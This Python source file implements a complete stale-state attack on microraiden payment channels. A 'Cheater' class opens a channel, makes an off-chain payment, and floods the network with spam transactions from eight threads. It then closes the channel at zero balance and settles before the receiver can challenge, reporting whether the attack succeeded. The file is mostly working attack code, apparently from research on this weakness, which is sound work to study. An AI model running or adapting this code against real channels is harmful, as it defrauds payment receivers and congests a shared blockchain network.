#!/usr/bin/python

import logging
import time
import datetime
from threading import Thread
from microraiden import Client
from microraiden.utils import privkey_to_addr
from microraiden.stale_state_attack.utils import (
    send_offchain_payment,
    create_close_channel_transaction,
    create_settle_channel_transaction,
    wait_for_open,
    wait_for_close,
    wait_for_settle,
    wait_for_block_generation,
)
from microraiden.stale_state_attack.spamming.spammer import Spammer


class Cheater():
    '''
    The Cheater class can be used to perform a state stale attack on a microraiden channel.
    '''

    def __init__(
        self,
        web3,
        private_key: str,
        channel_manager_address: str,
        receiver: str,
        proxy_address: str,
        initial_queue_size: int=2000,
    ):
        self.web3 = web3
        self.private_key = private_key
        self.receiver = receiver
        self.proxy_address = proxy_address
        self.logger = logging.getLogger('cheater')
        self.channel = None
        self.initial_queue_size = initial_queue_size

        # Initialize client
        self.client = Client(
            private_key=private_key,
            key_password_path=None,
            channel_manager_address=channel_manager_address,
        )

        self.challenge_period = self.client.context.channel_manager.call().challenge_period()

        # Set nonce offset for spamming transactions.
        # 1 for open channel transaction + 1 for close channel transaction.
        nonce_offset = 2

        # Check if there is already a suitable opened channel existing.
        suitable_channels = self.get_suitable_channels()
        if len(suitable_channels) > 0:
            # If there is already a channel, that can be used for the attack, we can
            # reduce the nonce_offset to 1 as no open channel transaction is required.
            nonce_offset = 1

        # Initialize spam manager
        self.spammer = Spammer(
            private_key=self.private_key,
            number_threads=8,
            target_block=self.web3.eth.blockNumber + 500,
            nonce_offset=nonce_offset,
        )

    def start(self):
        '''
        Perform a cheat attempt:
        1) Open new channel
        2) Send offchain payment
        3) Close with zero balance
        '''
        # Get an open channel
        self.initialize_channel(receiver=self.receiver, value=1)

        # Send an off-chain payment
        self.send_offchain_payment(amount=1)

        # Start stale state attack
        self.state_stale_attack(balance=0)

    def initialize_channel(self, receiver: str, value: int):
        '''
        Get or open a new channel to the given receiver that can sustain the given transfer value.
        '''
        self.channel = self.client.get_suitable_channel(
            receiver=self.web3.toChecksumAddress(receiver),
            value=value,
        )

        # Wait for open channel.
        try:
            wait_for_open(channel=self.channel, confirmations=2)
            self.logger.info(
                'Active channel: (sender={}, block={})'
                .format(self.channel.sender, self.channel.block)
            )
        except Exception as e:
            self.logger.warn(
                'Something failed, try again to wait for opened channel. Error: {}'
                .format(e)
            )
            wait_for_open(channel=self.channel, confirmations=2)

    def send_offchain_payment(self, amount: int):
        '''
        Send an offchain payment of the given {amount} through the channel.
        '''
        self.channel.create_transfer(amount)
        send_offchain_payment(
            channel=self.channel,
            resource_url='{}/echo/{}'.format(self.proxy_address, amount)
        )

    def state_stale_attack(self, balance: int=0):
        '''
        Performs a stale state attack on the given channel.
        Assumes that the given channel's balance is > 0. Closes the channel with balance 0
        and spams the network with transactions from the channel's sender account
        until the channel is settled or the challenge period is over. If the end of the challenge
        period is reached, a settle request is sent.
        '''
        # Start transaction spamming with 8 threads
        self.spammer.start()

        # Send spam transactions to be queued in the mempool.
        # self.spammer.update_target_block(self.web3.eth.blockNumber + 500)
        self.logger.info(
            'Wait until the initial number of {} transactions has been sent...'
            .format(self.initial_queue_size)
        )
        self.spammer.manager.wait_num_transactions_sent(self.initial_queue_size)

        # Pause spamming and wait until minimum number of signed spam transactions are in local queue.
        self.spammer.sending_pause()
        self.logger.info(
            'Waiting for full transaction queue ({} transactions)...'
            .format(self.initial_queue_size)
        )
        self.spammer.manager.wait_for_full_tx_queue(self.initial_queue_size)
        self.spammer.sending_continue()

        # Create close channel transaction
        close_tx = create_close_channel_transaction(
            channel=self.channel,
            balance=balance,
        )
        # Send close channel transaction
        close_tx_hash = self.web3.eth.sendRawTransaction(close_tx)
        self.logger.info('Sent close transaction (tx={})'.format(close_tx_hash.hex()))

        # Wait for channel to be closed
        closed_event = wait_for_close(self.channel)
        self.logger.info('Channel closed at block #{}'.format(closed_event['blockNumber']))

        # Get block number when channel can be settled
        _, _, settle_block, _, _ = self.channel.core.channel_manager.call().getChannelInfo(
            self.channel.sender, self.channel.receiver, self.channel.block
        )

        # Update target block for spamming thread.
        # NOTE The addition of 5 blocks ensures that the congestion is long enough to
        # let the sender's settle transaction be parsed before the receiver's one.
        self.spammer.update_target_block(settle_block + 5)

        settle_thread = Thread(target=self.settle_after_challenge_period, args=(settle_block,))
        settle_thread.start()

        # Wait for channel to be settled
        settled_event = wait_for_settle(self.channel)
        self.logger.info('Channel settled at block #{}'.format(settled_event['blockNumber']))

        # Stop the spamming
        self.spammer.stop()

        # Get the settle transaction
        settle_tx_hash = settled_event['transactionHash']
        settle_tx = self.web3.eth.getTransaction(settle_tx_hash)

        # Extract some interesting information
        close_block = self.web3.eth.getBlock(closed_event['blockNumber'])
        settle_block = self.web3.eth.getBlock(settled_event['blockNumber'])
        elapsed_time = None
        if (close_block is not None) & (settle_block is not None):
            elapsed_time = datetime.timedelta(
                seconds=settle_block['timestamp'] - close_block['timestamp']
            )

        # Determine, if sender or receiver settled the channel
        settled_by = settle_tx['from']
        attack_result_str = None
        if (settled_by == self.channel.receiver):
            attack_result_str = 'ATTACK FAILED'
            settled_by = 'Receiver'
        if (settled_by == self.channel.core.address):
            attack_result_str = 'ATTACK SUCCEEDED'
            settled_by = 'Sender'

        # Print result
        print()
        print('-----------------------------------------------------------')
        if attack_result_str is not None:
            print(attack_result_str)
            print()
        print('Sender \t\t {}'.format(self.channel.core.address))
        print('Receiver \t {}'.format(self.channel.receiver))
        # print('OPENED block \t #{}'.format(channel.block))
        # print('CLOSED block \t #{}'.format(closed_event['blockNumber']))
        # print('SETTLED block \t #{}'.format(settled_event['blockNumber']))
        print()
        print('Settled by \t\t {}'.format(settled_by))
        print('Settle balance \t\t {}'.format(settled_event['args']['_balance']))
        print('Spam transactions \t {}'.format(self.spammer.manager.tx_sent_counter))
        print('Elapsed time \t\t {}'.format(str(elapsed_time)))
        print(
            'CLOSE->SETTLE \t\t {}'
            .format(settled_event['blockNumber'] - closed_event['blockNumber'])
        )
        print('-----------------------------------------------------------')
        print()

    def settle_after_challenge_period(self, settle_block):
        # Wait until challenge period passed
        self.logger.info(
            'Waiting until challenge period = {} blocks is over...'
            .format(self.challenge_period)
        )
        wait_for_block_generation(self.web3, settle_block)
        self.logger.info('Challenge period is over.')

        # Create settle transaction
        settle_tx = create_settle_channel_transaction(self.channel)

        try:
            # Send settle transaction
            tx_hash = self.web3.eth.sendRawTransaction(settle_tx)
            self.logger.info('Sent settle transaction (tx={})'.format(tx_hash.hex()))
        except Exception as e:
            self.logger.error('Sending settle transaction failed: {}'.format(e))

    def get_suitable_channels(self):
        '''
        Returns a list of all open channels to the receiver with balance >= 1.
        '''
        open_channels = self.client.get_open_channels(self.receiver)
        return [c for c in open_channels if c.is_suitable(1)]
